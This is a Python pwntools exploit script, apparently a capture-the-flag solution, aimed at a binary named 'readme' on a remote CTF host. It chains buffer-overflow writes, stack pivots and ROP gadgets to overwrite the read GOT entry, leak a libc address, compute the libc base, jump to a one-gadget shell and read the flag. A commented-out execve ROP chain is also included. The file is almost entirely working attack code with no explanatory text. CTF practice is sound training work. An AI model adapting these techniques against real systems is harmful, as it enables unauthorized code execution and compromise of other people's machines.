import time
from pwn import *
from struct import pack
LOCAL = False
binary = './readme'

def pause():
    if LOCAL:
        raw_input('pause')
    else:
        time.sleep(0.2)

r = None
if LOCAL:
    r = process(binary)
else:
    r = remote('csie.ctf.tw', 10135)

context.arch = 'amd64'
libc = ELF('libc.so.6')

BUF1 = 0x601048
BUF2 = 0x601700
BUFX = 0x601c00
BUFF = 0x601150

RESOLVE_READ = 0x4004c6
READ_GOT = 0x601020
READ_PLT = 0x4004c0
PRINTF_GOT = 0x601018
PRINTF_PLT = 0x400621
READ = 0x40062b

pop_rsi_r15 = 0x4006b1
pop_rdi = 0x4006b3
pop_rbp = 0x400560
leave_ret = 0x400646

offset_to_system = 0xfffefb90

def x_to_addr(addr):
    p  = deadbeef * 4
    p += p64(addr+0x20)
    p += p64(READ)
    r.send(p)

def write_to_x(content):
    print "len_chk:", len(content)
    p  = content
    p += p64(BUFX)
    p += p64(READ)
    r.send(p)

deadbeef = p64(0xdeadbeef)

pause()
x_to_addr(BUF1)
write_to_x(flat([
pop_rdi, 1,
READ_PLT,
pop_rbp,
]))

x_to_addr(BUF1+0x20)
write_to_x(flat([
BUF2,
leave_ret,
0, 0
]))

x_to_addr(BUF2)
write_to_x(flat([
BUFX+0x20,
pop_rsi_r15, BUFX, 0,
]))

x_to_addr(BUF2+0x20)
write_to_x(flat([
pop_rdi, 0,
RESOLVE_READ,
leave_ret,
]))

x_to_addr(READ_GOT)
p  = '\x80' # write
r.send(p)
time.sleep(1)

r.readuntil('Read your input:')
libc_base = int(r.read(8)[::-1].encode('hex'), 16) - libc.symbols['write']
r.read(48-8)

binsh = libc_base + libc.search('/bin/sh\x00').next()
syscall = libc_base + 0xbc375
pop_rax = libc_base + 0x33544
pop_rsi = libc_base + 0x202e8
pop_rdx = libc_base + 0x1b92
print "libc_base:", hex(libc_base)
pause()
x_to_addr(BUF2)
write_to_x(flat([
0xf1117 + libc_base,
0, 0, 0
]))

#x_to_addr(BUF2)
#write_to_x(flat([
#pop_rax, 59,
#pop_rdi, binsh,
#]))
#x_to_addr(BUF2+0x20)
#write_to_x(flat([
#pop_rsi, 0,
#pop_rdx, 0
#]))
#x_to_addr(BUF2+0x40)
#write_to_x(flat([
#syscall,
#0, 0, 0
#]))
p  = deadbeef * 4
p += p64(BUF2-0x8)
p += p64(READ)
r.send(p)
p  = deadbeef * 4
p += p64(BUF2-0x8)
r.send(p)

time.sleep(0.2)
r.sendline('cat /home/' + binary + '/flag')
r.interactive()
